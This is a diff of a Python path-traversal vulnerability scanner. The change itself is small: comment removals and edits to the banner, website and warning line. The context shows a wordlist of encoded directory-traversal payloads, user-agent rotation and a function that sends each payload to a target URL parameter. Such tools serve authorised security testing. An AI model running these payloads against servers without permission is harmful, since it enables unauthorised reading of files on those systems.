@@ -4,7 +4,6 @@ import sys
 import random
 from urllib.parse import quote
 
-# Default Advanced Path Traversal Wordlist
 DEFAULT_WORDLIST = [
     "../", "..\\", "/", "\\",
     "%2e%2e%2f", "%2e%2e%5c", "%c0%ae%c0%ae/", "%252e%252e%252f", "%252e%252e%255c",
@@ -16,7 +15,6 @@ DEFAULT_WORDLIST = [
     ".././../", "..%2f..%2f..%2f", "....%2f%2f....%2f%2f", "..;../", "..%252f..%252f"
 ]
 
-# Randomized User-Agent List
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
@@ -24,11 +22,9 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36"
 ]
 
-# Function to perform double-encoding on a payload
 def double_encode(payload):
     return quote(quote(payload))
 
-# Function to test a single payload
 def test_payload(base_url, param, payload, timeout=5):
     try:
         headers = {
@@ -52,7 +48,6 @@ def test_payload(base_url, param, payload, timeout=5):
     except requests.RequestException as e:
         return {"url": url, "status": "Error", "length": 0, "snippet": str(e)}
 
-# Main function to run the traversal test
 def run_path_traversal_test(base_url, param, wordlist):
     print("[*] Starting Path Traversal Test...")
     print("[*] Target:", base_url)
@@ -89,15 +84,14 @@ def run_path_traversal_test(base_url, param, wordlist):
     else:
         print("[*] No clear vulnerabilities detected. Check responses manually for subtle leaks.")
 
-# User input and execution
 def main():
     print("==========================================================")
-    print("    Path Traversal Vulnerability Scanner (2025 Edition)   ")
+    print("   Path Traversal Vulnerability Scanner (2025 Edition)   ")
     print("----------------------------------------------------------")
-    print("     Developed by Praveen Kavinda  ")
-    print("   Website: https://prav33n.com")
+    print("   Developed by Praveen Kavinda")
+    print("   Website: https://prav33n.me")
     print("----------------------------------------------------------")
-    print("WARNING: Use only on systems you own or have explicit permission to test!")
+    print("|\ WARNING: Use only on systems you own or have explicit permission to test! /|")
     print("==========================================================")
 
     base_url = input("Enter the base URL (e.g., http://prav33n.me/download): ").strip()
